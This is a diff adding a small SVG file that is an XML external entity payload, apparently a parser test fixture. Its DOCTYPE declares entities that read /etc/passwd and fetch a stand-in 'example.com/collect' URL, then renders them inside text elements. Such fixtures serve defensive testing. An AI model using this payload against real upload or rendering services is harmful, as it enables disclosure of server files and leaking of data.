@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+    <!ENTITY harmless "just text">
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    <!ENTITY remote SYSTEM "https://example.com/collect?data=">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="120">
+    <title>&harmless;</title>
+    <text x="10" y="40" font-family="sans-serif" font-size="14">&xxe;</text>
+    <text x="10" y="70" font-family="sans-serif" font-size="14">&remote;</text>
+    <rect width="300" height="120" fill="none" stroke="#94a3b8"/>
+</svg>
